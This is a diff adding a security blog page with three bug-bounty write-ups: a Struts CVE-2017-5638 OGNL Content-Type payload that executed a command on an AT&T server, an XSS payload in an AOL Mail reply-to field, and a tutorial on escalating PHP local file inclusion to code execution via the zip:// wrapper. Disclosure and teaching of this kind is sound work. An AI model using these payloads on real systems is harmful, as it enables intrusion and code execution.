@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  
+  
+  <title>sxcurity.pro</title>
+  <meta name="description" content="Information Security blog by @sxcurity">
+  
+
+  <link rel="stylesheet" href="/assets/main.css">
+  <link rel="canonical" href="http://hack-r.be:4000/posts/2/">
+  
+  
+  <link rel="alternate" type="application/rss+xml" title="sxcurity.pro" href="http://hack-r.be:4000/feed.xml">
+
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="sxcurity">
+  <meta name="twitter:title" content="sxcurity.pro">
+  <meta name="twitter:description" content="Information Security blog by @sxcurity">
+  
+    <meta name="twitter:creator" content="sxcurity">
+  
+  
+
+  <script type="text/javascript">
+  WebFontConfig = {
+    google: { families: [ 'Bitter:400,700,400italic:latin' ] }
+  };
+  (function() {
+    var wf = document.createElement('script');
+    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
+      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
+    wf.type = 'text/javascript';
+    wf.async = 'true';
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(wf, s);
+  })();
+</script>
+
+  
+
+</head>
+
+
+  <body>
+
+    <header class="site-header" style="background-image: url(/images/coffee.jpg)">
+
+  <div class="wrapper">
+    <a class="site-title" style="text-decoration:none" href="/"><img height="30px" width="30px" src="/icon.svg"/>&nbsp;sxcurity.pro</a>
+
+    <nav class="site-nav">
+      
+        
+        <a class="page-link" href="/about/">[ About ]</a>
+      
+        
+        <a class="page-link" href="/archives/">[ Archives ]</a>
+      
+        
+        <a class="page-link" href="/advisories">[ Advisories ]</a>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="home">
+  
+
+  
+
+  <ul class="post-list">
+    
+      
+      
+
+      <li>
+        <header class="post-header">
+          <h1 class="post-title">
+            <a class="post-link" href="/2017/03/10/att-rce/">Remote Code Execution in AT&amp;T</a>
+          </h1>
+
+          <p class="post-meta">Mar 10, 2017</p>
+        </header>
+
+        <div class="post-content">
+          <p>I was pentesting AT&amp;T to see if I could find a vulnerability (as one does), around 4-5 days after CVE-2017-5638 was released.   Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 is vulnerable to <strong>Server-Side Template Injection</strong>, which allows attackers to execute commands on any vulnerable server. Basically, the file upload interceptor for these vulnerable versions “attempted to resolve error messages using a potentially dangerous function that evaluates OGNL.” It’s not actually a vulnerability within the Jakarta request wrapper, but rather in the file upload interceptor. <br /><br />
+I instantly was curious about this vulnerability and went to see if AT&amp;T ran Struts, so I started off with a simple Google dork: <code class="highlighter-rouge">site:att.com + ext:action</code> and <em>A LOT</em> of results came up! I grabbed a random one:  <code class="highlighter-rouge">https://www.att.com/tobrcontract/tobrinfotc.action</code><br /><br />
+I opened up Burp Suite, intercepted the request and sent it to the Repeater. I added this payload in the content-type header to see if it was vulnerable:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Content</span><span class="o">-</span><span class="nl">Type:</span><span class="o">%{(</span><span class="err">#</span><span class="n">nike</span><span class="o">=</span><span class="err">'</span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="err">'</span><span class="o">).(</span><span class="err">#</span><span class="n">dm</span><span class="o">=</span><span class="nd">@ognl</span><span class="o">.</span><span class="na">OgnlContext</span><span class="nd">@DEFAULT_MEMBER_ACCESS</span><span class="o">).(</span><span class="err">#</span><span class="n">_memberAccess</span><span class="o">?(</span><span class="err">#</span><span class="n">_memberAccess</span><span class="o">=</span><span class="err">#</span><span class="n">dm</span><span class="o">):((</span><span class="err">#</span><span class="n">container</span><span class="o">=</span><span class="err">#</span><span class="n">context</span><span class="o">[</span><span class="err">'</span><span class="n">com</span><span class="o">.</span><span class="na">opensymphony</span><span class="o">.</span><span class="na">xwork2</span><span class="o">.</span><span class="na">ActionContext</span><span class="o">.</span><span class="na">container</span><span class="err">'</span><span class="o">]).(</span><span class="err">#</span><span class="n">ognlUtil</span><span class="o">=</span><span class="err">#</span><span class="n">container</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="nd">@com</span><span class="o">.</span><span class="na">opensymphony</span><span class="o">.</span><span class="na">xwork2</span><span class="o">.</span><span class="na">ognl</span><span class="o">.</span><span class="na">OgnlUtil</span><span class="nd">@class</span><span class="o">)).(</span><span class="err">#</span><span class="n">ognlUtil</span><span class="o">.</span><span class="na">getExcludedPackageNames</span><span class="o">().</span><span class="na">clear</span><span class="o">()).!</span> <span class="o">(</span><span class="err">#</span><span class="n">ognlUtil</span><span class="o">.</span><span class="na">getExcludedClasses</span><span class="o">().</span><span class="na">clear</span><span class="o">()).(</span><span class="err">#</span><span class="n">context</span><span class="o">.</span><span class="na">setMemberAccess</span><span class="o">(</span><span class="err">#</span><span class="n">dm</span><span class="o">)))).(</span><span class="err">#</span><span class="n">cmd</span><span class="o">=</span><span class="err">'</span><span class="n">uname</span> <span class="o">-</span><span class="n">a</span><span class="err">'</span><span class="o">).(</span><span class="err">#</span><span class="n">iswin</span><span class="o">=(</span><span class="nd">@java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">System</span><span class="nd">@getProperty</span><span class="o">(</span><span class="err">'</span><span class="n">os</span><span class="o">.</span><span class="na">name</span><span class="err">'</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="err">'</span><span class="n">win</span><span class="err">'</span><span class="o">))).(</span><span class="err">#</span><span class="n">cmds</span><span class="o">=(</span><span class="err">#</span><span class="n">iswin</span><span class="o">?{</span><span class="err">'</span><span class="n">cmd</span><span class="o">.</span><span class="na">exe</span><span class="sc">','</span><span class="o">/</span><span class="n">c</span><span class="err">'</span><span class="o">,</span><span class="err">#</span><span class="n">cmd</span><span class="o">}:{</span><span class="err">'</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="sc">','</span><span class="o">-</span><span class="n">c</span><span class="err">'</span><span class="o">,</span><span class="err">#</span><span class="n">cmd</span><span class="o">})).(</span><span class="err">#</span><span class="n">p</span><span class="o">=</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">ProcessBuilder</span><span class="o">(</span><span class="err">#</span><span class="n">cmds</span><span class="o">)).(</span><span class="err">#</span><span class="n">p</span><span class="o">.</span><span class="na">redirectErrorStream</span><span class="o">(</span><span class="kc">true</span><span class="o">)).(</span><span class="err">#</span><span class="n">process</span><span class="o">=</span><span class="err">#</span><span class="n">p</span><span class="o">.</span><span class="na">start</span><span class="o">()).(</span><span class="err">#</span><span class="n">ros</span><span class="o">=(</span><span class="nd">@org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">struts2</span><span class="o">.</span><span class="na">ServletActionContext</span><span class="nd">@getResponse</span><span class="o">().</span><span class="na">getOutputStream</span><span class="o">())).(</span><span class="nd">@org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">commons</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOUtils</span><span class="nd">@copy</span><span class="o">(</span><span class="err">#</span><span class="n">process</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">(),</span><span class="err">#</span><span class="n">ros</span><span class="o">)).(</span><span class="err">#</span><span class="n">ros</span><span class="o">.</span><span class="na">flush</span><span class="o">())}</span> 
+</code></pre></div></div>
+<p>I sent the request and to my surprise, the command executed!<br /><br />
+<img src="/images/att-rce.png" alt="Code Execution" title="RCE" />
+<br /><br />
+I was absolutely astounded that after a week of this 0day being released, that such a big company would still be vulnerable WHEN they had a security team and bug bounty program! I also identified a subdomain that was vulnerable.<br /> All goes to show that if you are WORKING in information security, it would be smart to pay attention to the community and to the news so you can protect yourself.<br /><br />
+Regardless, that’s how I could’ve pwned AT&amp;T, which would have affected their hundreds millions of customers (<font color="#E22A3C">~147 million</font> wireless customers in the U.S. and Mexico). 
+<br /><br />
+Thanks for reading!<br /><br />
+<strong>Corben Douglas</strong> (<font color="#E22A3C">@sxcurity</font>)</p>
+<ul>
+  <li>https://hackerone.com/cdl</li>
+  <li>https://twitter.com/sxcurity</li>
+  <li>https://bugcrowd.com/c</li>
+  <li>https://github.com/sxcurity</li>
+</ul>
+
+
+        </div>
+        
+      </li>
+    
+      
+      
+
+      <li>
+        <header class="post-header">
+          <h1 class="post-title">
+            <a class="post-link" href="/2017/01/09/aol-xss/">XSS in mail.aol.com</a>
+          </h1>
+
+          <p class="post-meta">Jan 9, 2017</p>
+        </header>
+
+        <div class="post-content">
+          <p>I got bored one day and somehow thought of AOL for some reason, so I decided to see if I could find any vulnerabilities in mail.aol.com. Initially I tried looking in the signature, since it allowed HTML. I did find an XSS there, but it was self-xss, because when you sent an email with the malicious signature, the javascript was filtered out.<br /><br />
+I looked at all the other parameters shown in an email to see if I could bypass filtering but came up empty.
+Then another potential place for an XSS came to me: the <strong>reply-to</strong> parameter! I opened up Apple Mail on my Mac Book, created a new email and eventually came up with this payload: 
+<br />
+<code class="highlighter-rouge">&lt;&lt;h1/onmouseover=javascript:confirm&amp;#040document.cookie&amp;#041 width=800 height=800 style=@aol.com&gt;</code><br /><br />
+I added that as the reply-to email and sent it to the AOL I had created. When I tried to reply to the email, my payload triggered! 
+<br /><br />
+Here’s the proof of concept video: https://drive.google.com/file/d/0B8sZyyQEiBRpZmd2MGZiY0M5ZVE/view
+<br /><br />
+I was thanked and added to their Hall of Fame for 2017: https://contact.security.aol.com/hof/
+<br /><br />
+Thanks for reading,<br /><br />
+<strong>Corben Douglas</strong> (<font color="#E22A3C">@sxcurity</font>)</p>
+<ul>
+  <li>https://hackerone.com/cdl</li>
+  <li>https://twitter.com/sxcurity</li>
+  <li>https://bugcrowd.com/c</li>
+  <li>https://github.com/sxcurity</li>
+</ul>
+
+
+        </div>
+        
+      </li>
+    
+      
+      
+
+      <li>
+        <header class="post-header">
+          <h1 class="post-title">
+            <a class="post-link" href="/2017/01/01/zip-to-rce-lfi/">Leveraging LFI to RCE using zip://</a>
+          </h1>
+
+          <p class="post-meta">Jan 1, 2017</p>
+        </header>
+
+        <div class="post-content">
+          <p>So you’ve found a page that’s vulnerable to Local File Inclusion: 
+<br /><br />
+<img src="/images/lfi/lfi-1.png" alt="LFI-1" title="LFI-1" />
+<br />
+ You do some testing to leverage this vulnerability to RCE, but nothing’s working
+Null bytes don’t work, <code class="highlighter-rouge">/proc/self/environ</code> doesn’t work, and wrappers that lead to RCE
+such as <code class="highlighter-rouge">data://</code> or <code class="highlighter-rouge">php://input</code> do not work either. Don’t give up yet, there may be another way! 
+<br /><br />
+Let’s start off by trying to read the source code of this page! Let’s see if <code class="highlighter-rouge">php://filter</code> works:
+<code class="highlighter-rouge">http://127.0.0.1/vuln.php?page=php://filter/convert.base64-encode/resource=vuln</code>
+<br /><br />
+<img src="/images/lfi/lfi-2.png" alt="LFI-2" title="LFI-2" />
+<br /><br />
+Voila! It works. Once base64 decoded the code is: <br /><br />
+<img src="/images/lfi/lfi-3.png" alt="LFI-3" title="LFI-3" />
+<br /><br />
+Now you can see how the page is being requested. It’s using include to request the page &amp; appending the .php
+(ignore the commented line below it, I was was merely playing with RFI). 
+<br /><br />
+So now we know we can read files on the site. Use this to try to find the full path of the site, since you can use it. Now say this site has a function where you can upload a profile picture or upload a picture to a gallery. Awesome, then you’re in luck!
+<br /><br />
+Write some php code (Ex: <code class="highlighter-rouge">&lt;?php phpinfo(); ?&gt;</code> and <strong>compress it</strong> to a zip file.
+Rename the zip file to <em>avatar.jpg</em> (change the extension to an image file) and upload it.<br />
+<br /><br />
+My picture is uploaded to http://127.0.0.1/avatars/myavi.jpg
+Now here’s the trick using the <strong>zip://</strong> wrapper! 
+<br /><br />
+<code class="highlighter-rouge">zip:///path/to/filename#dir/file</code> (URL Encode the # to %23) when exploiting.
+<br /><br /></p>
+<h3>Example:</h3>
+<p>With full path: <br /><br />
+<code class="highlighter-rouge">http://127.0.0.1/vuln.php?page=zip:///Library/WebServer/Documents/avatars/myavi.jpg%23shell</code>
+<br /><br />
+Without full path: <br /><br />
+<code class="highlighter-rouge">http://127.0.0.1/vuln.php?page=zip://avatars/myavi.jpg%23shell</code>
+<br /><br />
+I did not have to add the .php to the end because the script will automatically appends it!
+Now, we have successfully leveraged this LFI to an RCE using the <strong>zip://</strong> wrapper! 
+<br /><br />
+<img src="/images/lfi/lfi-4.png" alt="LFI-4" title="LFI-4" />
+<br /><br />
+Thanks for reading,<br /><br />
+<strong>Corben Douglas</strong> (<font color="#E22A3C">@sxcurity</font>)</p>
+<ul>
+  <li>https://hackerone.com/cdl</li>
+  <li>https://twitter.com/sxcurity</li>
+  <li>https://bugcrowd.com/c</li>
+  <li>https://github.com/sxcurity</li>
+</ul>
+
+
+        </div>
+        
+      </li>
+    
+  </ul>
+
+  
+  <div class="pagination">
+    
+
+    
+      <a class="next" href="/">Newer &raquo;</a>
+    
+  </div>
+
+
+
+</div>
+
+      </div>
+    </main>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <p>
+      
+
+&copy; Corben Douglas - Twitter: <a href="https://twitter.com/sxcurity">@sxcurity</a> - Subscribe via <a href="http://hack-r.be:4000/feed.xml">RSS</a>
+
+    </p>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
